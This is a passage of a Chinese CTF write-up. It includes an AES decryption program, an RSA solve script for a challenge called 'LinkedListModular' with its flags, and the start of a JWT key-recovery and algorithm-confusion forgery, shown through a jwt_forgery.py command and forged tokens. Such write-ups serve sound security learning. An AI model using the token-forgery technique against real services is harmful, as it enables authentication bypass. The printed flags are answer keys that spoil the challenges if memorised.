class="type">uint8_t</span> line=<span class="number">0</span>,rol=<span class="number">0</span>;            <span class="comment">//位置</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line">        line = (S[i]&amp;<span class="number">0xf0</span>)&gt;&gt;<span class="number">4</span>;</span><br><span class="line">        rol = S[i]&amp;<span class="number">0xf</span>;</span><br><span class="line">        inv_S[line*<span class="number">16</span>+rol] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">uint8_t</span> key[<span class="number">16</span>] = &#123;<span class="number">83</span>, <span class="number">89</span>, <span class="number">67</span>, <span class="number">76</span>, <span class="number">79</span>, <span class="number">86</span>, <span class="number">69</span>, <span class="number">82</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">67</span>, <span class="number">76</span>, <span class="number">79</span>, <span class="number">86</span>, <span class="number">69</span>, <span class="number">82</span>&#125;;</span><br><span class="line">    <span class="comment">//const uint8_t pt[16]=&#123;0x32, 0x43, 0xf6, 0xa8, 0x88, 0x5a, 0x30, 0x8d, 0x31, 0x31, 0x98, 0xa2, 0xe0, 0x37, 0x07, 0x34&#125;;</span></span><br><span class="line">    <span class="type">uint8_t</span> ct[<span class="number">32</span>] = &#123;<span class="number">0x99</span>, <span class="number">0xE8</span>, <span class="number">0xB8</span>, <span class="number">0x01</span>, <span class="number">0xC8</span>, <span class="number">0x82</span>, <span class="number">0x51</span>, <span class="number">0x93</span>, <span class="number">0x12</span>, <span class="number">0xEE</span>,</span><br><span class="line">  <span class="number">0x89</span>, <span class="number">0x64</span>, <span class="number">0xE7</span>, <span class="number">0xEF</span>, <span class="number">0x63</span>, <span class="number">0x8D</span>, <span class="number">0x51</span>, <span class="number">0xDF</span>, <span class="number">0x5D</span>, <span class="number">0x78</span>,</span><br><span class="line">  <span class="number">0x39</span>, <span class="number">0xAA</span>, <span class="number">0x39</span>, <span class="number">0x62</span>, <span class="number">0xA0</span>, <span class="number">0xB4</span>, <span class="number">0x50</span>, <span class="number">0x30</span>, <span class="number">0x47</span>, <span class="number">0x30</span>,</span><br><span class="line">  <span class="number">0x21</span>, <span class="number">0x06</span>&#125;;     <span class="comment">// 外部申请输出数据内存，用于加密后的数据</span></span><br><span class="line">    <span class="type">uint8_t</span> plain[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;  <span class="comment">// 外部申请输出数据内存，用于解密后的数据</span></span><br><span class="line">    <span class="comment">//aesEncrypt(key, 16, pt, ct, 16); // 加密</span></span><br><span class="line">    <span class="comment">//printHex(pt, 16, &quot;plain data:&quot;); // 打印初始明文数据</span></span><br><span class="line">    <span class="comment">//printHex(ct, 16, &quot;after encryption:&quot;);  // 打印加密后的密文</span></span><br><span class="line"></span><br><span class="line">    aesDecrypt(key, <span class="number">16</span>, ct, plain, <span class="number">32</span>);       <span class="comment">// 解密</span></span><br><span class="line">    printHex(plain, <span class="number">32</span>, <span class="string">&quot;after decryption:&quot;</span>); <span class="comment">// 打印解密后的明文数据</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SYC&#123;B3l1eue_Th@t_y0u__l3aRn_Aes&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Reverse-Crypto"><a href="#Reverse-Crypto" class="headerlink" title="Reverse/Crypto"></a>Reverse/Crypto</h2><h3 id="LinkedListModular"><a href="#LinkedListModular" class="headerlink" title="LinkedListModular"></a>LinkedListModular</h3><blockquote><p>公司职员发现关键数据被加密了，请帮忙解密出来，注意e和phi。flag为输入的256长度的hex字符串的md5值，并包裹flag{}提交。该题需要一些逆向基础(C实现的程序，内含链表、gmp库相关)，可与队友联合解题，也可学习些二进制基础，对以后有益。</p></blockquote><p>分析，key为 <code>KnowYouLikeCrypto</code>，生成的文件为异或key的结果，异或得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cmp0</span><br><span class="line"></span><br><span class="line">p:0xae1e96a501b0360bd9ca423f2d9366e7c01c56e2d02dd20effc4c290e8bbd2cc53bb2a65b5262e254418d706335708ebd713cf9fac04fb1209d666adc6ebb6fee8c97a8dde4c23d3704198f918de46fe69a0d4d7878341c25118e7d1ac368753ce45f77b64580e0a89e300ac8f1be75d3a001df26bcfdaf82a479e14f6f25bfb q:0xcfc337e9217545d01babb00c330747aed4e6d99df42892bffce38e9b5c8a89d0528a7daac8d0075d72813669bc332688c9f6df2793b393580ac71f05db159e2dee3a6fd34ca2ba5ccae8428efefd6ee5454b6751ca71c008468278d7fe911e8c292172fa77468e996d80f4661c24ccdcc76c655a9168b0edeed165b2dd89501b e:0xd322 c:0x6f23dc633746ecd6f6b6c753556a969ded7f9033b7617d4497b3a3ac685b92063e42c5657a01604ed084035637440889bd6865449021a15dfa33ed2d9531f50c41d452df7399554a35f4340993d64c9e1c7b54894d291b33ac95b39719093d788a1d218f54f00494990f8aff3d09e21edae2172cd8b42ae6f8abfdb05e5d9a6ff4b5092f60f8ce2a576e429a80bd15fc7073d75415c824fc450a9295128e30804760179bc3213ade1121d615f7ebbf192f93dd25031de12e12e15ae189db525ddbdfb2f54f098c0a027b6b1277c22108dfd2699f7946ce51f1c73a78721896bd8baa3b7fa4dfc063ab212eb0684531f372f2edc7b1f7baa3353b55cc750b95ff</span><br><span class="line"></span><br><span class="line">cmp1</span><br><span class="line"></span><br><span class="line">p:0x7a7b8ee72d467eefe378502ca7804e0b55e0b68987dd7e8c03f7f7f717554183d2a0d99c7b33e8e1a28be171b77f8974616ac49645d7d5cf6fe5f4dcbfd1d25c3ad75e1eb3e4038d55a29c7114e176fd34626c2a8e76021d079cdb85cc8016acab00047910dfa5cd0439a3cc13527557ea879c184454a443711083a4f9d1d46b q:0xc17c7a7fbc5469af413f79c07cc5b892cfbbaa00950b115e267e83e2669f3f6779c7302ecfc9f850e0e4185892e96d356d65b1d372432c5a3f297cfb8373fe9a090a3f8dadf6ef6f2ca5b5107454ee6b1385d165bb4bb7776cbbccb8de1993a5ebb34ee365ff39b9ec9613121ba99d74759e0bf80726805ce03ed7f1e49375f1 e:0x10ae c:0x5be0df3bb240ffd53f2d914eb79878231821a1dba5cc491a888c8fd553a905a7f1cea2750c39ea48ab4175115591310c0f9d63e1aee9d2480780f3ce4f98c57114cd2901ea6f560e04a0a9cec157dac3def734fa10ab54c27bf20211cf1f1f6f6afe5fc9ef5c9af864f054a5e61c48c6e6dc087cc350008d4232d08b0b5011923f1077ead75d54a792aa8a51a0b37bfa3faef0b9380cff209c7bf3a20fbbb087caf177b83c9bf03e965bd7347dd18418f3e50aef29cc89fa594ccd31b6f63f397eeba71629fec2c8699148dfd6be32deb96577690814bb4fe6dbefe2379468e0e317a870795ba04ab2e306fe5340700c415048eff5909a2453752845572a0931</span><br><span class="line"></span><br><span class="line">cmp2</span><br><span class="line"></span><br><span class="line">p:0xa2562b53b1ff8b9635122c92612d8b6ea43ac0e40115c03befc0fb1bdefcda35a77f1cf23e5fdfa51ee864dac707524584cf4243cade36ea0b2ce14d9337d796f85b730483e7b6e342d44a36a1bc4052125b4eaef3724af9cfb8cab719d9efc54df851042408c2f69c1e5f46f00f067f7fa5cf7a3cb227879cbdefac7eab6cd3 q:0xfeec12d4602e4895f53715d7e5a7583ee93c49079480aadae13c7c9d720a5fd976b6b9ac5ef65570f9e9d9b6d0b0b39f1372ea819bc14cc10a0a23a7f22f60c1a4fc536ebc4997bb873db9d8cb34f58fec2a05dc766cb865e09aa6c1a059713ccb1b31a9c986ecd4f45dc53c95e32ae6d370ee3566daa8b5f5bf6fe5fa20cd0f e:0xc051 c:0xa798cb067b716ae1382d2070efb8bdb71050b88d9503a68fe5e851999071e4ee9f72c88b3975de09e8f436566d75f90e6388fddb3497b1e8f8f6bf8ad13cd35040d6b5b3f2e3ba3b1dddf14800840b0bfb08f25b5546cd5a34025e8eaaf289478c5f1b91229a31c980f773deb90cc0752da82aa17585bb616fc0b4f0749003a36f11acbdd4e85f7b092ee3864835c1063afccdbf3b585855a03e904cbc9c7fe9d86011a1237e396e4e2c72deec76829de7e67282cda86abd348bb98aac5ea83f3735c70a29f45cff6b4b76b03f12c4ea936368d13ba15a87da416a91be05ebaa0e67e1070e5d7a15f178c42ff05bab0e3de009f00b8e4cecf950f7250427e12</span><br><span class="line"></span><br><span class="line">cmp3</span><br><span class="line"></span><br><span class="line">p:0xb06c6c2ac320c555cc4bc5bc89976436582de33d77788ed0eb1e5b726e242c2890ede50d918d3b7cab74141519e43761f515590279fb4fa8674a94d0985aedfa4b54580307416aa1888015e12e2536350ffa418203161b5fb2438035160327e21f4015d4b7393d90fff50f8d5be3da08abefac23898a55dc60a24470c8fe76eb q:0xadabc61519e9642517eb5c2a4a416f34c62a2c1ea6ec4c1d0d4686a95c31dcabba2c13fa8217e14fc541857b846d88027a1f7cfee9aba0757c3a92ab579086586c0e52b8184de0c69ae674b034342b0db40955fbffdc84ee875b9b84f7d2bf32836f03c304b34fea2ea03731af95d9156b91a16ff9338fe8a9fce24525b65509 e:0xd2c2 c:0x11861752a8ca58b777300efbc8ed05ea54d0c326cbfb573a0bd21fe5a20191b03f07be7aea9ac192adbe48726a0a03ccc838375d7c4fcd0b8814578fad47ea0407281bbb205960c6453fff81584ce334a23960c6321c720da7b190281c6d46b55e3bab0493d8ff6cf3855a2a6039c259f955e2cbdfb9dcabc813ad82c5333d535950e28cfb2aa556c32700f64c2b63058cf33fe6c40677a93d8c80a0f9db60da1ce90182ed0aa6ed33a2a9288dc9ff19ed9bffb59991bddf282b38a59ded27f71c4e5e0190e5244d916556c033bb2a184c87cf1923fb87902fa9dbb5ad5f927249bedfa4b47e5a379297926e3216a808b93ea2c7bf014c0b7ae29eacf595a43e</span><br></pre></td></tr></table></figure><p>解RSA：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">p1 = <span class="number">0xae1e96a501b0360bd9ca423f2d9366e7c01c56e2d02dd20effc4c290e8bbd2cc53bb2a65b5262e254418d706335708ebd713cf9fac04fb1209d666adc6ebb6fee8c97a8dde4c23d3704198f918de46fe69a0d4d7878341c25118e7d1ac368753ce45f77b64580e0a89e300ac8f1be75d3a001df26bcfdaf82a479e14f6f25bfb</span></span><br><span class="line">q1 = <span class="number">0xcfc337e9217545d01babb00c330747aed4e6d99df42892bffce38e9b5c8a89d0528a7daac8d0075d72813669bc332688c9f6df2793b393580ac71f05db159e2dee3a6fd34ca2ba5ccae8428efefd6ee5454b6751ca71c008468278d7fe911e8c292172fa77468e996d80f4661c24ccdcc76c655a9168b0edeed165b2dd89501b</span></span><br><span class="line">e1 = <span class="number">0xd322</span></span><br><span class="line">c1 = <span class="number">0x6f23dc633746ecd6f6b6c753556a969ded7f9033b7617d4497b3a3ac685b92063e42c5657a01604ed084035637440889bd6865449021a15dfa33ed2d9531f50c41d452df7399554a35f4340993d64c9e1c7b54894d291b33ac95b39719093d788a1d218f54f00494990f8aff3d09e21edae2172cd8b42ae6f8abfdb05e5d9a6ff4b5092f60f8ce2a576e429a80bd15fc7073d75415c824fc450a9295128e30804760179bc3213ade1121d615f7ebbf192f93dd25031de12e12e15ae189db525ddbdfb2f54f098c0a027b6b1277c22108dfd2699f7946ce51f1c73a78721896bd8baa3b7fa4dfc063ab212eb0684531f372f2edc7b1f7baa3353b55cc750b95ff</span></span><br><span class="line"></span><br><span class="line">p2 = <span class="number">0x7a7b8ee72d467eefe378502ca7804e0b55e0b68987dd7e8c03f7f7f717554183d2a0d99c7b33e8e1a28be171b77f8974616ac49645d7d5cf6fe5f4dcbfd1d25c3ad75e1eb3e4038d55a29c7114e176fd34626c2a8e76021d079cdb85cc8016acab00047910dfa5cd0439a3cc13527557ea879c184454a443711083a4f9d1d46b</span></span><br><span class="line">q2 = <span class="number">0xc17c7a7fbc5469af413f79c07cc5b892cfbbaa00950b115e267e83e2669f3f6779c7302ecfc9f850e0e4185892e96d356d65b1d372432c5a3f297cfb8373fe9a090a3f8dadf6ef6f2ca5b5107454ee6b1385d165bb4bb7776cbbccb8de1993a5ebb34ee365ff39b9ec9613121ba99d74759e0bf80726805ce03ed7f1e49375f1</span></span><br><span class="line">e2 = <span class="number">0x10ae</span></span><br><span class="line">c2 = <span class="number">0x5be0df3bb240ffd53f2d914eb79878231821a1dba5cc491a888c8fd553a905a7f1cea2750c39ea48ab4175115591310c0f9d63e1aee9d2480780f3ce4f98c57114cd2901ea6f560e04a0a9cec157dac3def734fa10ab54c27bf20211cf1f1f6f6afe5fc9ef5c9af864f054a5e61c48c6e6dc087cc350008d4232d08b0b5011923f1077ead75d54a792aa8a51a0b37bfa3faef0b9380cff209c7bf3a20fbbb087caf177b83c9bf03e965bd7347dd18418f3e50aef29cc89fa594ccd31b6f63f397eeba71629fec2c8699148dfd6be32deb96577690814bb4fe6dbefe2379468e0e317a870795ba04ab2e306fe5340700c415048eff5909a2453752845572a0931</span></span><br><span class="line"></span><br><span class="line">p3 = <span class="number">0xa2562b53b1ff8b9635122c92612d8b6ea43ac0e40115c03befc0fb1bdefcda35a77f1cf23e5fdfa51ee864dac707524584cf4243cade36ea0b2ce14d9337d796f85b730483e7b6e342d44a36a1bc4052125b4eaef3724af9cfb8cab719d9efc54df851042408c2f69c1e5f46f00f067f7fa5cf7a3cb227879cbdefac7eab6cd3</span></span><br><span class="line">q3 = <span class="number">0xfeec12d4602e4895f53715d7e5a7583ee93c49079480aadae13c7c9d720a5fd976b6b9ac5ef65570f9e9d9b6d0b0b39f1372ea819bc14cc10a0a23a7f22f60c1a4fc536ebc4997bb873db9d8cb34f58fec2a05dc766cb865e09aa6c1a059713ccb1b31a9c986ecd4f45dc53c95e32ae6d370ee3566daa8b5f5bf6fe5fa20cd0f</span></span><br><span class="line">e3 = <span class="number">0xc051</span></span><br><span class="line">c3 = <span class="number">0xa798cb067b716ae1382d2070efb8bdb71050b88d9503a68fe5e851999071e4ee9f72c88b3975de09e8f436566d75f90e6388fddb3497b1e8f8f6bf8ad13cd35040d6b5b3f2e3ba3b1dddf14800840b0bfb08f25b5546cd5a34025e8eaaf289478c5f1b91229a31c980f773deb90cc0752da82aa17585bb616fc0b4f0749003a36f11acbdd4e85f7b092ee3864835c1063afccdbf3b585855a03e904cbc9c7fe9d86011a1237e396e4e2c72deec76829de7e67282cda86abd348bb98aac5ea83f3735c70a29f45cff6b4b76b03f12c4ea936368d13ba15a87da416a91be05ebaa0e67e1070e5d7a15f178c42ff05bab0e3de009f00b8e4cecf950f7250427e12</span></span><br><span class="line"></span><br><span class="line">p4 = <span class="number">0xb06c6c2ac320c555cc4bc5bc89976436582de33d77788ed0eb1e5b726e242c2890ede50d918d3b7cab74141519e43761f515590279fb4fa8674a94d0985aedfa4b54580307416aa1888015e12e2536350ffa418203161b5fb2438035160327e21f4015d4b7393d90fff50f8d5be3da08abefac23898a55dc60a24470c8fe76eb</span></span><br><span class="line">q4 = <span class="number">0xadabc61519e9642517eb5c2a4a416f34c62a2c1ea6ec4c1d0d4686a95c31dcabba2c13fa8217e14fc541857b846d88027a1f7cfee9aba0757c3a92ab579086586c0e52b8184de0c69ae674b034342b0db40955fbffdc84ee875b9b84f7d2bf32836f03c304b34fea2ea03731af95d9156b91a16ff9338fe8a9fce24525b65509</span></span><br><span class="line">e4 = <span class="number">0xd2c2</span></span><br><span class="line">c4 = <span class="number">0x11861752a8ca58b777300efbc8ed05ea54d0c326cbfb573a0bd21fe5a20191b03f07be7aea9ac192adbe48726a0a03ccc838375d7c4fcd0b8814578fad47ea0407281bbb205960c6453fff81584ce334a23960c6321c720da7b190281c6d46b55e3bab0493d8ff6cf3855a2a6039c259f955e2cbdfb9dcabc813ad82c5333d535950e28cfb2aa556c32700f64c2b63058cf33fe6c40677a93d8c80a0f9db60da1ce90182ed0aa6ed33a2a9288dc9ff19ed9bffb59991bddf282b38a59ded27f71c4e5e0190e5244d916556c033bb2a184c87cf1923fb87902fa9dbb5ad5f927249bedfa4b47e5a379297926e3216a808b93ea2c7bf014c0b7ae29eacf595a43e</span></span><br><span class="line"></span><br><span class="line">f1 = (p1-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">f2 = (p2-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">f3 = (p3-<span class="number">1</span>)*(q3-<span class="number">1</span>)</span><br><span class="line">f4 = (p4-<span class="number">1</span>)*(q4-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(gcd(e1,f1))</span><br><span class="line"><span class="built_in">print</span>(gcd(e2,f2))</span><br><span class="line"><span class="built_in">print</span>(gcd(e3,f3))</span><br><span class="line"><span class="built_in">print</span>(gcd(e4,f4))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line">d1 = inverse(e1//<span class="number">2</span>,f1)</span><br><span class="line">m1c = <span class="built_in">pow</span>(c1,d1,p1*q1)</span><br><span class="line">m1 = gmpy2.iroot(mpz(m1c),mpz(<span class="number">2</span>))[<span class="number">0</span>]</span><br><span class="line">m1h = <span class="built_in">hex</span>(m1)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(m1h)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">d2 = inverse(e2//<span class="number">2</span>,f2)</span><br><span class="line">m2c = <span class="built_in">pow</span>(c2,d2,p2*q2)</span><br><span class="line">m2 = gmpy2.iroot(mpz(m2c),mpz(<span class="number">2</span>))[<span class="number">0</span>]</span><br><span class="line">m2h = <span class="built_in">hex</span>(m2)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(m2h)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line">d3 = inverse(e3//<span class="number">3</span>,f3)</span><br><span class="line">m3c = <span class="built_in">pow</span>(c3,d3,p3*q3)</span><br><span class="line">m3 = gmpy2.iroot(mpz(m3c),mpz(<span class="number">3</span>))[<span class="number">0</span>]</span><br><span class="line">m3h = <span class="built_in">hex</span>(m3)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(m3h)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line">d4 = inverse(e4//<span class="number">2</span>,f4)</span><br><span class="line">m4c = <span class="built_in">pow</span>(c4,d4,p4*q4)</span><br><span class="line">m4 = gmpy2.iroot(mpz(m4c),mpz(<span class="number">2</span>))[<span class="number">0</span>]</span><br><span class="line">m4h = <span class="built_in">hex</span>(m4)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(m4h)</span><br><span class="line"></span><br><span class="line">flag = m1h+m2h+m3h+m4h</span><br><span class="line">h = md5(flag.encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;flag&#123;&#123;<span class="subst">&#123;h&#125;</span>&#125;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 688682bc45a043f2e139153780fdd54af8517dd885464bdfa3dbcf776169255c</span></span><br><span class="line"><span class="comment"># 9304306d542508c59abf30f99b98fefcd2951df2effc81fca8e5aa26414819cb</span></span><br><span class="line"><span class="comment"># 144576b4302a8c5262d7d4d9b2ebb3468835c709cc88fc0b8b38b52a6f31d3ab</span></span><br><span class="line"><span class="comment"># 6b25edeccfcf74f0dfc77abc90d757a49c1d0fb1c90e67db7918c61be80ad59c</span></span><br><span class="line"><span class="comment"># flag&#123;d3f06717efc6c0daf454ffeac9764687&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Crypto-Web"><a href="#Crypto-Web" class="headerlink" title="Crypto/Web"></a>Crypto/Web</h2><h3 id="jwt-pickle"><a href="#jwt-pickle" class="headerlink" title="jwt_pickle"></a>jwt_pickle</h3><blockquote><p>jwt和pickle,做就完事了OUO</p></blockquote><p>代码审计，发现jwt使用RS256加密，且使用RS256或HS256解密。</p><p>参考：<a href="https://www.cnblogs.com/gxngxngxn/p/18514445#web01">2024网鼎杯初赛-青龙组-WEB01</a></p><p>先生成两个token，然后利用rsa_sign2n工具来生成公钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">python3 jwt_forgery.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFhYSIsInBhc3N3b3JkIjoiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCJpc19hZG1pbiI6ZmFsc2V9.esPiIzL35oWvFOGJeibCt7otZWE-83pVzGuljOE4O19amvZ2Y8zwgW71M-_CSVh_Wdiaz8RJaBKs-w_WCFSoEhEr7bToIDH5zeY38d8H4gkBpNGLhFWvhoRF5a-T0VrHS7JeTSJdyVgqpS7vF5o8pT3Q_fC13Hv4I-lMCYfeNhCe-SQnm9c86wVwF7i0KLY0vvi4CI9zx-iZWSzNHFmSpnXmQms8Tg9KoKO7Qq6SpccPbL4eJ5o52lSAjtohSeubVJcC_suXlNuB-odexWVozcuTRcAC-9uGUAWl7qZHc3TZffFOotggGONL5qSqpQJR5ST8KbCJkqk2hGnBpg9GSw eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImNjYyIsInBhc3N3b3JkIjoiNzc5NjNiN2E5MzEzNzdhZDRhYjVhZDZhOWNkNzE4YWEiLCJpc19hZG1pbiI6ZmFsc2V9.mJJbTtmHn_4dUKpaTEdETBdpFuTF7AggxptHdDuIPnD2FaIA1gX2Ys9PB5R4vLzi8MUTLB4Wufuoh2UCQnSzX0lVUx347ujgHUO_xrvPwkUAiZjoM4j5W7csJWMsSL-9T3AmHpRjJbHnXvmVzt_xQvOSBU1KUgkw2tyuwxPqjPJjkpKXIaialQmRL2ML3t2SdWiyPvPy9yo4BXQFRpFRLAA82C7OZN43wuoSSUVBvwnh6XnQXAoVugLxnFF7qFrxLDeb0b37K3_-ynMiU4FvLArGvgaWkQqvM2PdOEVpynvsM5SRGsrxvgJqo19aaSwjnttksRbfKLOJcKUFW3XwLg</span><br><span class="line">[*] GCD:  0x4</span><br><span class="line">[*] GCD:  0x2cdf3da1c5b0e166e522b8eee9feb75e98fe6a9e9bc0092cd81e32916cfee418321e21801d4b385b9361600765d21dde3e02a1a42734ebccad3194ed323cc09a4a78cccab401bb6139b3537871c649d8a0da4358e1f9e565ec5fcdd42c3660000755f53ff91a59dd7eb6ee9895cfcfd058826ac70353fe8fb55e65b62fa929bc3ea29998aff334a3c217053ab04120272b582e6692bb88bd23a3478e4462be43f8c39b3256e0d64399e51f0f0ea69c9726a6c91dae89e1b7c58f2655dcb291cccc862b13565dd5b844d3494a92e614fa90f07a66f8f10e19090bc76c6c954e82bc47afafd3df8384dcfd2d1fbfa8266923ea8b48c6b8f112df6d8e67420e076a4</span><br><span class="line">[+] Found n with multiplier 1  :</span><br><span class="line"> 0x2cdf3da1c5b0e166e522b8eee9feb75e98fe6a9e9bc0092cd81e32916cfee418321e21801d4b385b9361600765d21dde3e02a1a42734ebccad3194ed323cc09a4a78cccab401bb6139b3537871c649d8a0da4358e1f9e565ec5fcdd42c3660000755f53ff91a59dd7eb6ee9895cfcfd058826ac70353fe8fb55e65b62fa929bc3ea29998aff334a3c217053ab04120272b582e6692bb88bd23a3478e4462be43f8c39b3256e0d64399e51f0f0ea69c9726a6c91dae89e1b7c58f2655dcb291cccc862b13565dd5b844d3494a92e614fa90f07a66f8f10e19090bc76c6c954e82bc47afafd3df8384dcfd2d1fbfa8266923ea8b48c6b8f112df6d8e67420e076a4</span><br><span class="line">[+] Written to 2cdf3da1c5b0e166_65537_x509.pem</span><br><span class="line">[+] Tampered JWT: b<span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.Ay8GNWt_1llpI5Q8qPOt-wIs7c8AjxQZ85nc97Y0b8Y&#x27;</span></span><br><span class="line">[+] Written to 2cdf3da1c5b0e166_65537_pkcs1.pem</span><br><span class="line">[+] Tampered JWT: b<span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.4lUi6OL8NIqdBeJ9y0s4BkV9-5twlf973KXfVuB0bXg&#x27;</span></span><br><span class="line">[+] Found n with multiplier 2  :</span><br><span class="line"> 0x166f9ed0e2d870b372915c7774ff5baf4c7f354f4de004966c0f1948b67f720c190f10c00ea59c2dc9b0b003b2e90eef1f0150d2139a75e65698ca76991e604d253c66655a00ddb09cd9a9bc38e324ec506d21ac70fcf2b2f62fe6ea161b300003aafa9ffc8d2ceebf5b774c4ae7e7e82c41356381a9ff47daaf32db17d494de1f514ccc57f99a51e10b829d5820901395ac1733495dc45e91d1a3c722315f21fc61cd992b706b21ccf28f8787534e4b9353648ed744f0dbe2c7932aee5948e666431589ab2eeadc2269a4a549730a7d48783d337c78870c8485e3b6364aa7415e23d7d7e9efc1c26e7e968fdfd4133491f545a4635c78896fb6c733a10703b52</span><br><span class="line">[+] Written to 166f9ed0e2d870b3_65537_x509.pem</span><br><span class="line">[+] Tampered JWT: b<span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.aApemXL-HmcakktrnGr1XaUpkfaMOp4oL919wO3MJy0&#x27;</span></span><br><span class="line">[+] Written to 166f9ed0e2d870b3_65537_pkcs1.pem</span><br><span class="line">[+] Tampered JWT: b<span 